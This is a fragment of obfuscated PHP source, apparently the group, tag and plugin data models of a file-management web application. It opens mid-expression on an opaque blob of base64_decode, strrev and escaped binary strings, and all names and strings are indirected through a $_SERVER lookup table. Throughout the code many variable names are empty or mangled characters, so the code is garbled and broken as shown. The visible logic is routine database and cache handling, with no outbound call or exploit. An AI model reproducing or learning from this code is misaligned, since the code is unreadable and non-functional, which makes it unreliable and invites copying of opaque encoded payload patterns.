x15".base64_decode('IyJlk1rMiT36xT4TwsLDIsmmN3sB93FPqtXvOLlL6gkpQilC1RfU4t5cYj5ZNXz0F3yAK12irGI=').strrev('\'Za3:KTG$	.>AK|QxRhV6tVN,')."\144\317\131\135\166\266\305\221\112\44\221\62\51\256\313\43\11\44\260\356\223\120\362\241\103\341\2\61\361\111\247\153\57\136\214\317\31\52\103\54\50\275\216\124\327\221\32\113\34\31\333\350\312\2\151\234"."\xd4\x7c\x4d\xa1\x9d\x84\x2\x7a\x3e\x22\x35\x27\xeb\x2e\xcc\x5a\x21\x5e\xfb\x23\x2\x2b\x9d\x20\x96\x4\x54\x22\x83\xb1\x2e\x72\x2b\x8e\x77\x54\xf9\xc0\xa0\x64\x4c\xce\x74\x74\xa7\x6\x6a\xb0\x93\x84\x2c\xe6\xad\xce\x34\xf3"."\x79\x7c\x41\x3d\x4b\x36\xd5\x9d\x96\x76\xda\xea\x12\x79\xae\x80\x43\x3b\x44\x8e\xc5\x62\xe1\xd0\xc4\x2\x11\x23\xd1\xbc\x80\x33\x8b\x96\xd7\x5d\x70\x93\x2b\xb8\x61\x4a\x6b\xc8\xfb\x9d\x23\x7d\xdc\xb0\x53\x39\xe9\xc\x5f\x9d".base64_decode('WZ1erppm6EDtcbh7y2bZrcskGqnqj6RolTBr1KE9qlmNZuGa4hTlqDsLCHBdmoXrVmWzylVwJfU=')."\154\255\142\315\62\274\152\340\201\170\62\135\143\300\102\354\47\25\235\15\236\65\13\127\177\16\326\200\273\64\21\202\325\356\205\44\45\164\252\277\324\352\105\315\302\263\366\302\135\132\360\101\370\314\134\53".strrev('%'."\0".'+2,Ih#V[#Vp/'."\r".'^DުP^7PG;')."\x49\x53\xc0\x18\x8f\xca\x46\xc4\x5c\x5\x52\xb4\x84\x18\xc6\xbc\x31\x22\x74\x6d\x99\x49\x10\x48\x50\xb8\xa6\xea\x48\xd1\xe4\x5b\x66\x5a\xe8\x57\xf3\x8e\x54\x35\xe0\x5c\x7\xc5\x8a\xf4\x90\x4e\x4d\xa3\x24\xf\x96\x64\x55\xcb"."\x8c\xf2\xec\x85\x8\xd9\x9c\x8b\x1e\xe1\x4d\xdb\x48\x49\xa\xa8\xc2\x24\x85\x8f\xcc\x10\x67\xda\xbc\x90\x3d\xbb\x6f\x8\x84\xb0\xcd\xa1\xb1\x54\x4b\x9c\x8e\x93\x68\xd0\x27\x7c\xc1\xd3\xf6\xc4\x58\x24\x4\x71\x18\xd\x52\xce"."\10\156\25\251\142\102\20\153\305\360\13\151\162\77\100\71\11\232\35\67\313\266\207\152\324\227\310\157\207\151\333\102\237\207\335\126\240\163\0\146\7\74\222\46\33\12\211\233\150\334\51\162\241\111\160\230"."\336\67\340\40\250\110\140\61\121\134\247\271\204\350\71\42\370\352\224\107\142\325\67\247\135\374\51\223\21\63\235\64\47\230\323\146\204\71\22\114\44\247\225\340\350\121\322\265\43\136\152\54\77\315\361\303".base64_decode('05FectPhBTfCw6Wsozp9wptryn9cCyDlF03Qd96IVBcMFeOJeFVWXyAeXxeNddJn4aqySS1Jr7E=')."\52\253\257\73\332\73\133\136\250\47\20\216\124\345\141\25\310\136\125\170\376\246\131\341\76\322\113\162\347\77\133\57\302\301\65\242\47\354\336\61\2\57\220\213\111\220\156\335\112\71\263\70\333\74\262\6"."\342\32\163\256\50\137\100\351\5\341\56\136\64\342\224\242\311\227\124\26\173\171\206\7\234\157\103\273\364\215\235\32\64\14\163\241\131\254\327\330\13\137\212\225\40\25\277\255\307\11\0\77\117\10\135\32"."\x9f\x43\x8d\x47\x4a\x27\x8b\x84\x50\x1d\x69\xed\xca\xbb\x3b\xb9\xb8\xe5\xc2\x35\x92\x3d\xbf\x26\x34\x6b\xdc\x1e\xca\x57\xb0\x38\x57\x0\x7\x77\xf3\x44\xf6\x8\xce\xb0\x99\x94\x34\x18\xe9\xd9\xe\x7c\x11\x0\xb8\x25\x4d\x56"."\32\166\144\333\132\326\313\311\201\244\240\102\5\336\230\50\10\121\364\377\1\54\111\354\127\134\311\0\0", 10, -8))); goto E; eЙ: $fileSize = strrev(base64_decode($_SERVER[][0])); function binCheckNeq($, $È) { return $ != $È; } $_SERVER[$_SERVER[][1]] = $fileSize($_SERVER[$_SERVER[][2]]); goto DΪ; aֈ: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\160"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\x61\x6d\x65" => "\x67\x72\157\x75\160\x5f\155\x65\x74\x61", "\155\145\x74\141\x46\x69\145\x6c\x64" => "\x67\162\x6f\165\160\111\x44"); protected function cacheFunctionAlias($) { $Ǳ =& $_SERVER[ܮ]; return array($Ǳ[2263] => array($[0], $Ǳ[2264]), $Ǳ[2265] => array($[0], $Ǳ[2266])); } protected function ___getInfo($ڱ) { $ = $this->getInfoSimple($ڱ); if (!$) { return !1; } return $this->_listDataApplyItem($); } protected function ___getInfoSimple($ܴ) { $ھ = array($_SERVER[ܮ][1496] => intval($ܴ)); $ = $this->where($ھ)->find(); return is_array($) ? $ : array(); } protected function groupAdd($) { $̐ =& $_SERVER[ܮ]; if (!$[$̐[190]] && isset($[$̐[1496]]) && $[$̐[1496]] == 1) { if ($ͩ = $this->getInfoSimple($[$̐[1496]], !0)) { return $[$̐[1496]]; } } else { $ͩ = $this->getInfoSimple($[$̐[190]]); if (!$ͩ) { return !1; } } $ = $̐[613]; if ($ͩ[$̐[604]]) { $ = $ͩ[$̐[604]] . $ͩ[$̐[1496]] . $̐[50]; } $Ʉ = array($̐[509] => $this->groupNameAuto($[$̐[190]], $[$̐[32]]), $̐[492] => $[$̐[190]], $̐[674] => $, $̐[2267] => $[$̐[2168]], $̐[2268] => 0, $̐[2186] => 0); $[$̐[32]] = $Ʉ[$̐[32]]; if (isset($[$̐[2204]])) { $Ʉ[$̐[2204]] = $[$̐[2204]]; } else { $ǡ = $this->max($̐[2204]); if (!$ǡ) { $ǡ = 0; } $Ʉ[$̐[2204]] = $ǡ + 1; } if (!empty($[$̐[1496]])) { $Ʉ[$̐[1496]] = $[$̐[1496]]; } $¶ = $this->add($Ʉ); $this->groupMetaEdit($¶, $); Model($̐[1534])->groupRootAdd($¶); $this->_clearCache($[$̐[190]]); return $¶; } protected function groupEdit($ͫŖ, $ݛ݆) { $ =& $_SERVER[ܮ]; $ = $this->getInfoSimple($ͫŖ); if (!$) { return !1; } if (!empty($ݛ݆[$[190]])) { $ = $this->getInfoSimple($ݛ݆[$[190]]); if (!$) { return !1; } if ($[$[1496]] == $[$[1496]]) { return !1; } if ($ݛ݆[$[190]] != $[$[190]]) { if ($[$[604]] !== $[$[604]] && strpos($[$[604]], $[$[604]] . $[$[1496]] . $[50]) === 0) { return !1; } $ݛ݆[$[674]] = $[$[604]] . $ݛ݆[$[190]] . $[50]; $this->_changeChildLevel($, $); $this->_clearCache($[$[1496]]); $this->_clearCache($[$[190]]); } } $this->groupMetaEdit($ͫŖ, $ݛ݆); $this->_clearChildrenCache($); return $this->where(array($[2269] => $ͫŖ))->save($ݛ݆); } private function groupMetaEdit($, &$) { $ڬ =& $_SERVER[ܮ]; if (isset($[$ڬ[32]])) { $this->setNamePinyin($, $[$ڬ[32]]); } if (isset($[$ڬ[2270]])) { $ਆ = array($ڬ[2270] => $[$ڬ[2270]], $ڬ[2271] => $[$ڬ[2271]]); unset($[$ڬ[2270]]); unset($[$ڬ[2271]]); if (isset($[$ڬ[2272]])) { $ = $ڬ[1492] . $; $౞ = $ڬ[1491]; $ = $[$ڬ[2272]] ? $[$ڬ[2272]] : $ڬ[12]; $ٗ = Model($ڬ[1490])->get($, $౞); $ٗ = $ٗ ? $ٗ : $ڬ[12]; if ($ٗ != $) { if (!$ && $ٗ) { Model($ڬ[1490])->remove($, $౞); } else { if ($) { Model($ڬ[1490])->set($, $, $౞); } } } $ਆ[$ڬ[2272]] = $; } $this->metaSet($, $ਆ); } } private function _clearChildrenCache($) { $ =& $_SERVER[ܮ]; $椓 = array($[674] => array($[635], $[$[604]] . $[$[1496]] . $[636])); $ = $this->field($[1496])->where($椓)->select(); foreach ($ as $撔) { $this->_clearCache($撔[$[1496]]); } } private function _clearCache($ʛ) { $六 =& $_SERVER[ܮ]; $this->cacheFunctionClear($六[2273], $ʛ); $this->cacheFunctionClear($六[2274], $ʛ); } private function _changeChildLevel($Ȇ, $, $֘Ì = false) { $ =& $_SERVER[ܮ]; $颴 = $Ȇ[$[604]] . $Ȇ[$[1496]] . $[50]; $؉Ā = $[$[604]] . $[$[1496]] . $[50] . $Ȇ[$[1496]] . $[50]; if ($֘Ì) { $؉Ā = $[$[604]] . $[$[1496]] . $[50]; } $ = array($[674] => array($[635], $Ȇ[$[604]] . $Ȇ[$[1496]] . $[636])); $ձ = array($[674] => array($[683], "\162\145\x70\154\x61\143\x65\x28\160\141\162\145\x6e\164\114\145\166\145\154\x2c\x27{$颴}\x27\54\47{$؉Ā}\47\51")); $this->_clearChildrenCache($Ȇ); $this->where($)->data($ձ)->save(); } public function setNamePinyin($犻, $ = false) { $ΐ̜ =& $_SERVER[ܮ]; if (!$) { $ŏ = $this->getInfoSimple($犻); $ = $ŏ[$ΐ̜[32]]; } if (!Input::check($, $ΐ̜[677])) { $this->metaSet($犻, $ΐ̜[552], null); $this->metaSet($犻, $ΐ̜[551], null); return; } $񫽆 = array($ΐ̜[552] => str_replace($ΐ̜[53], $ΐ̜[12], Pinyin::get($)), $ΐ̜[551] => Pinyin::get($, $ΐ̜[678])); $this->metaSet($犻, $񫽆); } protected function metaSet($԰, $ = null, $⃧ = null) { $this->_clearCache($԰); return parent::metaSet($԰, $, $⃧); } protected function groupStatus($қ, $) { $ھ =& $_SERVER[ܮ]; $㢳 = $this->getInfoSimple($қ); if (!$㢳) { return !1; } $this->_clearCache($қ); return $this->metaSet($қ, $ھ[848], $); if ($ == $ھ[91]) { $ꕪ = $this->parentLevelArray($㢳[$ھ[604]]); } else { } $ꕪ[] = $㢳[$ھ[1496]]; $؟ە = array(); foreach ($ꕪ as $қ) { $؟ە[] = array($ھ[1496] => $қ, $ھ[95] => $ھ[848], $ھ[451] => $); $this->_clearCache($қ); } return Model($ھ[2275])->addAll($؟ە, array(), !0); } protected function groupRemove($, $ = false) { $ì =& $_SERVER[ܮ]; $鹆 = array($ì[1496] => $); $⿧ = $this->where($鹆)->find(); if (!$⿧ || $⿧[$ì[190]] == 0) { return !1; } if (!$) { $Ҵ = $this->getInfoSimple($⿧[$ì[190]]); $this->_changeChildLevel($⿧, $Ҵ, !0); $this->where(array($ì[190] => $))->save(array($ì[190] => $⿧[$ì[190]])); $this->_clearCache($Ҵ[$ì[1496]]); } Model($ì[2275])->where($鹆)->delete(); Model($ì[2276])->where($鹆)->delete(); Model($ì[939])->groupRootRemove($); $this->_clearCache($⿧[$ì[190]]); return $this->where($鹆)->delete(); } protected function groupSort($) { $ =& $_SERVER[ܮ]; $ = array(); foreach ($ as $ѻ => $̓) { $[] = array($[1496], $̓, $[2204], $ѻ + 1); } $this->saveAll($); } public function listData() { $؉ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($؉[$_SERVER[ܮ][446]]); return $؉; } private function _makeOrder($ = '') { $ʟĒ =& $_SERVER[ܮ]; $ٶ = array($ʟĒ[1496], $ʟĒ[32], $ʟĒ[2170], $ʟĒ[231]); $à = array($ʟĒ[537] => $ʟĒ[538], $ʟĒ[539] => $ʟĒ[540]); $΋ = Input::get($ʟĒ[544], $ʟĒ[7], $ʟĒ[2186], $ٶ); $􂘾 = Input::get($ʟĒ[545], $ʟĒ[7], $ʟĒ[2277], array($ʟĒ[2277], $ʟĒ[539])); $􂘾 = $à[$􂘾]; $ = $ . "{$΋}\x20{$􂘾}\54\40\147\162\157\165\x70\x49\104\x20\x61\163\143"; return $this->order($); } public function listChild($ٛ) { $ =& $_SERVER[ܮ]; $ = $this->where(array($[190] => $ٛ))->_makeOrder()->selectPage(200); $this->_listDataApply($[$[446]]); return $; } public function listChildIds($) { $ =& $_SERVER[ܮ]; if (is_string($)) { $ = explode($[50], $); } $ = $this->where(array($[1496] => array($[7], $)))->field($[2278])->select(); if (!$) { return !1; } $ = array(); foreach ($ as $ځ) { $[] = "\163\145\154\x65\x63\164\40\147\162\x6f\165\x70\x49\104\40\146\x72\x6f\155\x20\x60\x67\162\157\x75\x70\140\40\167\150\145\162\145\x20\160\x61\x72\145\156\164\x4c\145\x76\145\x6c\40\154\x69\153\x65\40\x27{$ځ[$[604]]}{$ځ[$[1496]]}\x2c\x25\x27"; } $ = implode($[2279], $); $ = $this->query($); if (!$) { return array(); } $ = array_to_keyvalue($, $[12], $[1496]); return array_unique($); } public function listByID($) { $臟 =& $_SERVER[ܮ]; if (!$) { return array(); } $ݪ = array($臟[1496] => array($臟[7], $)); $ = $this->where($ݪ)->select(); $ = array_sort_keep($, $臟[1496], $); $this->_listDataApply($); return $; } public function listSearch($އ) { $ =& $_SERVER[ܮ]; $ = trim($އ[$[2280]]); $ = explode($[53], $); if (!$ || count($) == 1) { return $this->listSearchNow($އ); } $ܗ = array($[446] => array()); foreach ($ as $˗Ȇ) { if (!trim($˗Ȇ)) { continue; } $އ[$[2280]] = $˗Ȇ; $܌ = $this->listSearchNow($އ); $ܗ[$[446]] = array_merge($ܗ[$[446]], $܌[$[446]]); } $ܗ[$[446]] = array_unique_by_key($ܗ[$[446]], $[1496]); $ܗ[$[443]] = array($[444] => count($ܗ[$[446]]), $[439] => 20, $[428] => 1, $[445] => 1); return $ܗ; } public function listSearchNow($̔) { $߆ =& $_SERVER[ܮ]; $Ħ = trim($̔[$߆[2280]]); $䋥 = isset($̔[$߆[2281]]) ? $̔[$߆[2281]] : !1; if (!trim($Ħ)) { return !1; } $Ħ = str_replace($߆[2282], $߆[2283], $Ħ); $ = array($߆[1496] => array($߆[473], "{$Ħ}\45"), $߆[32] => array($߆[473], "\45{$Ħ}\x25"), $߆[1168] => $߆[2284]); if ($䋥) { $ = $this->getInfoSimple($䋥); $ = $[$߆[604]] . $䋥 . $߆[636]; $ = array($, array($߆[604] => array($߆[473], $))); } $ = $this->parseWhereLike($); $և = $this->_makeOrder()->where($)->selectPage(20); $և = $և ? $և : array($߆[446] => array(), $߆[443] => array()); if (!$և || count($և[$߆[446]]) < 5 && Input::check($Ħ, $߆[393])) { $ׂ = $this->groupChildrenAll($䋥); $ = $this->_searchFromMeta($߆[551], $Ħ, 10, $ׂ); $ = $this->_searchFromMeta($߆[552], $Ħ, 10, $ׂ); $ = array_merge($, $, $և[$߆[446]]); $և[$߆[446]] = array_unique_by_key($, $߆[1496]); $և[$߆[443]][$߆[444]] = count($և[$߆[446]]); $և[$߆[443]][$߆[445]] = ceil($և[$߆[443]][$߆[444]] / $և[$߆[443]][$߆[439]]); } $this->_listDataApply($և[$߆[446]]); return $և; } protected function groupChildrenAll($) { $® =& $_SERVER[ܮ]; if (!$) { return !1; } if (!is_array($)) { $ = array($); } $ = $; foreach ($ as $䋗) { $ = $this->getInfoSimple($䋗); $ = array($®[604] => array($®[473], $[$®[604]] . $䋗 . $®[636])); $т = $this->field($®[1496])->where($)->select(); $ = array_merge($, array_to_keyvalue($т, $®[12], $®[1496])); } return array_unique($); } private function _searchFromMeta($ύ򟿎, $, $ҵý, $醢) { $ =& $_SERVER[ܮ]; $ = strtolower($); $Ӥ = array($[95] => $ύ򟿎, $[451] => array($[473], "\x25{$}\45")); $Ӥ = $this->parseWhereLike($Ӥ); if ($醢) { $Ӥ[$[1496]] = array($[7], $醢); } $ = Model($[2285])->where($Ӥ)->limit($ҵý)->select(); if (!$) { return array(); } $ = array_to_keyvalue($, $[12], $[1496]); $ = $this->where(array($[2269] => array($[7], $)))->select(); if (!$) { return array(); } return $; } protected function _listDataApplyItem($כ) { $ = array($כ); $this->_listDataApply($); return $[0]; } protected function _listDataApply(&$) { $ܱ =& $_SERVER[ܮ]; if (!$) { return; } $Ӟ = array_to_keyvalue($, $ܱ[12], $ܱ[1496]); $this->_listAppendChildren($); $this->_listAppendChildrenMember($); $this->_listAppendMeta($, $Ӟ); $this->_listAppendParent($); $this->_listAppendSourceRoot($, $Ӟ); } private function _listAppendChildren(&$Թ) { $ۤ =& $_SERVER[ܮ]; $ = array_to_keyvalue($Թ, $ۤ[12], $ۤ[1496]); $ = array($ۤ[190] => array($ۤ[7], $)); $Ŝ = array($ۤ[190], $ۤ[2286] => $ۤ[585]); $ = $this->field($Ŝ)->where($)->group($ۤ[190])->select(); $ = array_to_keyvalue($, $ۤ[190], $ۤ[585]); foreach ($Թ as &$ĝ) { $䴷 = $ĝ[$ۤ[1496]]; $ĝ[$ۤ[2287]] = isset($[$䴷]) ? intval($[$䴷]) : !1; } unset($ĝ); } private function _listAppendChildrenMember(&$) { $͐ =& $_SERVER[ܮ]; $ = array_to_keyvalue($, $͐[12], $͐[1496]); $ϔ = array($͐[1496] => array($͐[7], $)); $ٓ = array($͐[1496], $͐[2286] => $͐[585]); $ړ = Model($͐[2276])->field($ٓ)->where($ϔ)->group($͐[1496])->select(); $ = array_to_keyvalue($ړ, $͐[1496], $͐[585]); foreach ($ as &$ݹŝ) { $ܚ = $ݹŝ[$͐[1496]]; $ݹŝ[$͐[2288]] = isset($[$ܚ]) ? intval($[$ܚ]) : !1; } unset($ݹŝ); } private function _listAppendMeta(&$, $) { $И =& $_SERVER[ܮ]; $ؐѕ = array($И[1496] => array($И[7], $)); $ꔚ = Model($И[2275])->where($ؐѕ)->select(); $ꔚ = array_to_keyvalue_group($ꔚ, $И[1496]); foreach ($ꔚ as &$) { $ = array_to_keyvalue($, $И[95], $И[451]); } unset($); foreach ($ as &$) { $[$И[555]] = array(); if (isset($ꔚ[$[$И[1496]]])) { $[$И[555]] = $ꔚ[$[$И[1496]]]; } } unset($); } protected function parentLevelArray($݊) { $ =& $_SERVER[ܮ]; $݊ = explode($[50], trim($݊, $[50])); $݊ = array_remove_value($݊, $[228]); return $݊; } protected function parentInGroup($Ҿ, $) { $ɷ =& $_SERVER[ܮ]; $ = $this->getInfoSimple($Ҿ); if (!$) { return !0; } $Ӈ = $this->parentLevelArray($[$ɷ[604]]); $Ӈ[] = $Ҿ; foreach ($Ӈ as $Ҿ) { if (in_array($Ҿ . $ɷ[12], $)) { return !0; } } return !1; } private function _listAppendParent(&$) { $ =& $_SERVER[ܮ]; $ϑ = array(); foreach ($ as &$) { $ϑ[$[$[1496]]] = $[$[32]]; $͋ = $this->parentLevelArray($[$[604]]); foreach ($͋ as $㗀) { if (!isset($ϑ[$㗀])) { $ϑ[$㗀] = 0; } } } unset($); foreach ($ϑ as $ => $Ʉ) { if ($Ʉ) { continue; } $槐 = $this->getInfoSimple($); $ϑ[$] = $槐[$[32]]; } $ = $GLOBALS[$[6]][$[92]][$[2289]]; if (KodUser::isRoot()) { $ = !1; } foreach ($ as &$) { $͋ = $this->parentLevelArray($[$[604]]); $Ħ灊 = $[12]; foreach ($͋ as $ => $㗀) { if ($ && $ == 0) { continue; } $Ħ灊 .= $ϑ[$㗀] . $[8]; } if ($͋) { $Ħ灊 .= $[$[32]]; } $[$[609]] = str_replace($[254], $[8], $Ħ灊); } unset($); } private function _listAppendSourceRoot(&$, $Ö) { $朹 =& $_SERVER[ܮ]; $荵 = Model($朹[939])->listSourceRoot(SourceModel::TYPE_GROUP, $Ö); $荵 = array_to_keyvalue($荵, $朹[589]); $荵 = array_remove_key($荵, $朹[589]); foreach ($ as &$騠) { $騠[$朹[90]] = $荵[$騠[$朹[1496]]] ? $荵[$騠[$朹[1496]]] : array(); } unset($騠); } protected function groupMerge($ĥ) { $ĥ = array_values(array_unique($ĥ)); $ = array(); for ($ = 0; $ < count($ĥ); $++) { $Ƙʋ = !1; for ($ = 0; $ < count($ĥ); $++) { if ($ == $) { continue; } if ($this->isParentOf($ĥ[$], $ĥ[$])) { $Ƙʋ = !0; break; } } if (!$Ƙʋ) { $[] = $ĥ[$]; } } return $; } protected function isParentOf($ݵ, $) { $ =& $_SERVER[ܮ]; if (!$ݵ || !$ || $ݵ == $) { return !1; } $ = $this->getInfoSimple($ݵ); $ = $this->getInfoSimple($); $ = $[$[604]] . $ݵ . $[50]; if (substr($[$[604]], 0, strlen($)) == $) { return !0; } return !1; } public function groupShowRoot($, $ = false) { $̦ =& $_SERVER[ܮ]; $݇ = $this->getInfo($); if (!$݇) { return array(); } $˱ݷ = $this->parentLevelArray($݇[$̦[604]]); $ = array($); if (count($˱ݷ) == 0) { return $; } if ($ && count($˱ݷ) == 1) { return $; } if (!$݇[$̦[555]] || !isset($݇[$̦[555]][$̦[2270]]) || $݇[$̦[555]][$̦[2270]] == $̦[950]) { return $this->groupShowRoot($˱ݷ[count($˱ݷ) - 1], $); } if ($݇[$̦[555]][$̦[2270]] == $̦[432]) { $⾩ = explode($̦[50], $݇[$̦[555]][$̦[2271]]); if ($⾩) { $ = array_merge($, $⾩); } } return $; } protected function resetParentLevel() { $ =& $_SERVER[ܮ]; $ = $[1496]; $⬎ = $this->select(); $⬎ = array_to_keyvalue($⬎, $); foreach ($⬎ as $͊) { $ō = $͊; $ = array(); while ($ō[$[190]] != 0) { $[] = $ō[$[190]]; $ō = $⬎[$ō[$[190]]]; } $[] = 0; $ = $[50] . implode($[50], array_reverse($)) . $[50]; $this->setNamePinyin($͊[$], $͊[$[32]]); $this->where(array($ => $͊[$]))->save(array($[674] => $)); } return $⬎; } public function groupNameAuto($͸, $) { $¶ =& $_SERVER[ܮ]; $Ł = $this->where(array($¶[492] => $͸))->getField($¶[32], !0); if (!$Ł || !in_array($, $Ł)) { return $; } for ($ = 1; $ <= count($Ł) + 1; $++) { $Ş = $ . "\50{$}\51"; if (!in_array($Ş, $Ł)) { return $Ş; } } } public function groupSwitch($ׄ, $ږ) { $죴 =& $_SERVER[ܮ]; $ = array($죴[1496] => array($죴[7], array($ׄ, $ږ))); $ѣ = $this->where($)->select(); $ѣ = array_to_keyvalue($ѣ, $죴[1496]); $ֶ = _get($ѣ, $ׄ); $ = _get($ѣ, $ږ); if (!$ֶ || !$ || $ֶ[$죴[190]] == 0) { return !1; } if ($ֶ[$죴[1496]] == $[$죴[1496]]) { return !1; } if (strpos($[$죴[604]], $ֶ[$죴[604]] . $ֶ[$죴[1496]] . $죴[50]) === 0) { return !1; } $ = array($죴[1496] => $ׄ); $ = Model($죴[2276])->where($)->select(); if (!$) { $ = array(); } foreach ($ as $䡤) { $ߚ = $䡤[$죴[1593]]; $ = array($죴[1593] => $ߚ, $죴[1496] => $ږ); $꾌 = Model($죴[2276])->where($)->find(); if (!$꾌) { $ = array($ږ => $䡤[$죴[1641]]); Model($죴[617])->userGroupAdd($ߚ, $); } Model($죴[617])->userGroupRemove($ߚ, $ׄ); } $ = array($죴[188] => 2, $죴[190] => 0, $죴[500] => 1, $죴[589] => array($죴[7], array($ׄ, $ږ))); $ӧ׉ = Model($죴[939])->where($)->field($죴[2290])->select(); $ӧ׉ = array_to_keyvalue($ӧ׉, $죴[589], $죴[191]); $蹚 = !empty($ӧ׉[$ׄ]) ? $ӧ׉[$ׄ] : !1; if ($蹚) { if (!$ӧ׉[$ږ]) { $ӧ׉[$ږ] = Model($죴[939])->groupRootAdd($ږ); } $ح = $ӧ׉[$ږ]; $ = array($죴[190] => $蹚); $ӧ׉ = Model($죴[939])->where($)->field($죴[2291])->select(); if (!$ӧ׉) { $ӧ׉ = array(); } Model($죴[939])->moveClearAuth = !1; foreach ($ӧ׉ as $Ԥ) { $ = $Ԥ[$죴[500]] == $죴[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($죴[939])->move($Ԥ[$죴[191]], $ح, $); } Model($죴[939])->moveClearAuth = !0; $ = array($죴[188] => 2, $죴[589] => $ׄ); $䍤 = array($죴[589] => $ږ); Model($죴[2292])->where($)->save($䍤); Model($죴[2293])->where($)->save($䍤); } $this->_changeChildLevel($ѣ[$ׄ], $ѣ[$ږ], !0); $this->where(array($죴[190] => $ׄ))->save(array($죴[190] => $ږ)); $this->_clearChildrenCache($ѣ[$ږ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($) { $֐ =& $_SERVER[ܮ]; return array($֐[2294] => array($[0], $֐[2295]), $֐[2296] => array($[0], $֐[2297])); } protected function ___get($ƕۺ) { $ =& $_SERVER[ܮ]; $ = Model($[605])->metaGet($ƕۺ, $[2298]); $ί = json_decode($, !0); return $ί ? $ί : array($[2299] => $[91], $[446] => array()); } protected function ___listData($) { $ů =& $_SERVER[ܮ]; $՚ = array($ů[1968] => 0, $ů[573] => array($ů[2300], 0), $ů[511] => $ů[1492] . $); $ˣ = $ů[2301]; $а = $this->field($ˣ)->where($՚)->order($ů[2302])->select(); return $а ? $а : array(); } protected function set($, $ە) { $՜ =& $_SERVER[ܮ]; $ە = $ە ? $ە : array($՜[2299] => $՜[91], $՜[446] => array()); return Model($՜[605])->metaSet($, $՜[2298], json_encode($ە)); } protected function getByTagID($, $ϵ) { $ =& $_SERVER[ܮ]; if (!$ || !$ϵ) { return !1; } if (!Model($[605])->getInfoSimple($)) { return !1; } $̈ = $this->get($); if (!$̈ || !isset($̈[$[446]])) { return !1; } $Ӡ = array_find_by_field($̈[$[446]], $[487], $ϵ); return is_array($Ӡ) ? $Ӡ : !1; } public function listSource($Ք, $䯚) { $δ˪ =& $_SERVER[ܮ]; if ($䯚 && !is_array($䯚)) { $䯚 = array($䯚); } $偪 = $this->get($Ք); $ = array_to_keyvalue($偪[$δ˪[446]], $δ˪[487]); $ = array_to_keyvalue($偪[$δ˪[598]], $δ˪[487]); $٪ = $this->listData($Ք); $Ү = array(); foreach ($䯚 as $) { $פ = $[$]; $҃ = _get($פ, $δ˪[598]); if (!$פ || !$҃ || !$[$҃]) { continue; } if (!$Ү[$҃]) { $Ү[$҃] = array(); } $Ү[$҃][] = $; } $ʏ = array(); $ǜ = array(); foreach ($٪ as $Ф) { $ = $Ф[$δ˪[87]]; $פ = $[$Ф[$δ˪[515]]]; $҃ = _get($פ, $δ˪[598]); if (!$פ || !$҃ || !$Ү[$҃] || !$) { continue; } if (!in_array($Ф[$δ˪[515]], $Ү[$҃])) { continue; } if (!$ʏ[$]) { $ʏ[$] = array(); } $ʏ[$][] = $҃; } foreach ($ʏ as $ => $Ӥ) { if (count($Ӥ) != count($Ү)) { continue; } $ǜ[] = $; } if (!$䯚) { $ǜ = array_to_keyvalue($٪, $δ˪[12], $δ˪[87]); } $ǜ = array_unique($ǜ); if (!$ǜ) { return array(); } $̧ = array($δ˪[506] => array($δ˪[507], $ǜ), $δ˪[589] => $Ք, $δ˪[188] => SourceModel::TYPE_GROUP); $ = Model($δ˪[1534])->listSource($̧); if (!$ || count($ǜ) == $[$δ˪[443]][$δ˪[444]]) { return $; } $ŗ = array(); $ = array_to_keyvalue($[$δ˪[85]], $δ˪[12], $δ˪[191]); $ة = array_to_keyvalue($[$δ˪[86]], $δ˪[12], $δ˪[191]); $ = array_merge($ة, $); foreach ($ǜ as $) { if (!in_array($, $)) { $ŗ[] = $; } } if ($ŗ) { $this->removeBySource($Ք, $ŗ); } return $; } protected function addToTag($, $, $Ыд) { $ =& $_SERVER[ܮ]; if (!$this->getByTagID($, $Ыд) || !$) { return !1; } if (!Model($[939])->pathInfo($)) { return !1; } $̣շ = array($[1968] => 0, $[573] => $Ыд, $[510] => $, $[511] => $[2303] . $, $[509] => $[12], $[2186] => 0); if ($this->where($̣շ)->find()) { return !1; } return $this->add($̣շ); } protected function removeFromTag($, $шސ, $) { $ۆ =& $_SERVER[ܮ]; if (!$this->getByTagID($, $) || !$шސ) { return !1; } if (is_array($шސ)) { $шސ = array($ۆ[7], $шސ); } $ = array($ۆ[1968] => 0, $ۆ[573] => $, $ۆ[511] => $ۆ[2303] . $, $ۆ[510] => $шސ); return $this->where($)->delete(); } protected function removeByTag($诗, $׻) { $ɥ =& $_SERVER[ܮ]; if (!$this->getByTagID($诗, $׻)) { return !1; } $𛰳 = array($ɥ[1968] => 0, $ɥ[573] => $׻, $ɥ[511] => $ɥ[2303] . $诗); return $this->where($𛰳)->delete(); } protected function removeBySource($ę, $﷜) { $ =& $_SERVER[ܮ]; if (!$ę || !$﷜) { return !1; } if (is_array($﷜)) { $﷜ = array($[7], $﷜); } $ƽ = array($[1968] => 0, $[510] => $﷜, $[573] => array($[1182], 0), $[511] => $[2303] . $ę); return $this->where($ƽ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\x70\x6c\165\x67\x69\156\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\163\164\141\164\165\x73", "\162\x65\147\151\145\x73\164", "\x63\x6f\x6e\146\151\147"); public function loadList($눣 = false) { $ެ = array_to_keyvalue($this->listData(), $_SERVER[ܮ][32]); if ($눣) { return $ެ[$눣]; } return $ެ; } public function init() { $ =& $_SERVER[ܮ]; Hook::trigger($[2304]); $ = $this->loadPluginList(); foreach ($ as $ => $ȳ) { $鐥 = $this->appAllow($, $ȳ); if (!$鐥) { continue; } foreach ($ȳ[$[2305]] as $ݡ => $Ǯ) { Hook::bind($ݡ, $Ǯ); } } Hook::trigger($[2306]); Hook::trigger(ACTION); } public function appAllow($, $ͩ, $Լ = true) { $⦈ =& $_SERVER[ܮ]; $ = PLUGIN_DIR . $ . $⦈[2307]; if (!is_array($ͩ) || !is_array($ͩ[$⦈[2305]]) || $ͩ[$⦈[848]] != 1 || !is_file($)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$⦈[6]][$⦈[2308]] || !$GLOBALS[$⦈[6]][$⦈[2309]]) { return !0; } $ߙ = explode($⦈[50], strtolower($GLOBALS[$⦈[6]][$⦈[2309]])); return in_array(strtolower($), 